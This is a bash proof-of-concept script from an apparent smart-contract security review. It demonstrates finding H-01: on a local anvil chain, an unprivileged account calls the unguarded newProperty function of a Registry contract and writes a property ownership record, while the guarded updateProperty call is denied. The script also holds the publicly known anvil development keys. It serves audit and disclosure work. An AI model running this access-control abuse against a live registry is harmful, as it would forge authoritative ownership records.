#!/usr/bin/env bash
# Proof-of-concept for SECURITY-REVIEW.md finding H-01:
#   Registry.newProperty has no access control, so any account can write
#   authoritative ownership records.
#
# It spins up a local anvil chain, deploys Registry from account 0 (which the
# constructor makes Admin), then shows account 1 -- an address with no roles --
# successfully registering a property. As a control, the same account is denied
# by the (correctly) guarded updateProperty.
#
# Requires Foundry (anvil, forge, cast). Run from the repo root: bash poc/h01-access-control.sh
set -u
export PATH="$HOME/.foundry/bin:$PATH"

RPC=http://127.0.0.1:8545
# Well-known anvil dev keys (safe to publish -- local test chain only).
ADMIN_PK=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80    # account 0 (deployer -> Admin)
ATTACKER_PK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d # account 1 (no roles)
ATTACKER=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
PIN=42

anvil --silent &
ANVIL_PID=$!
trap "kill $ANVIL_PID 2>/dev/null" EXIT
# wait for the node to accept RPC (no sleep)
for _ in $(seq 1 100); do cast block-number --rpc-url $RPC >/dev/null 2>&1 && break; done

REG=$(forge create contracts/Registry.sol:Registry --rpc-url $RPC --private-key $ADMIN_PK --broadcast --json \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["deployedTo"])')
echo "Registry deployed at: $REG (admin = anvil account 0)"
echo

echo "[H-01] Attacker = account 1 (no Admin role) calls newProperty($ATTACKER, $PIN)"
if cast send "$REG" "newProperty(address,uint256)" "$ATTACKER" "$PIN" --rpc-url $RPC --private-key $ATTACKER_PK >/dev/null 2>&1; then
  echo "  -> transaction SUCCEEDED (an access-controlled registry should have reverted)"
else
  echo "  -> reverted (finding not reproduced)"; exit 1
fi
OWNER=$(cast call "$REG" "getPropertyOwner(uint256)(address)" "$PIN" --rpc-url $RPC)
echo "  -> Registry now reports PIN $PIN owner = $OWNER"
[ "$(echo "$OWNER" | tr '[:upper:]' '[:lower:]')" = "$(echo "$ATTACKER" | tr '[:upper:]' '[:lower:]')" ] \
  && echo "  -> H-01 CONFIRMED: unprivileged account wrote an authoritative ownership record."
echo

echo "[control] Same attacker calls the guarded updateProperty(...)"
if cast send "$REG" "updateProperty(address,uint256)" "0x000000000000000000000000000000000000dEaD" "$PIN" --rpc-url $RPC --private-key $ATTACKER_PK >/dev/null 2>&1; then
  echo "  -> unexpectedly SUCCEEDED"
else
  echo "  -> reverted, as intended (updateProperty is onlyAdmin). Access model works where it is applied."
fi
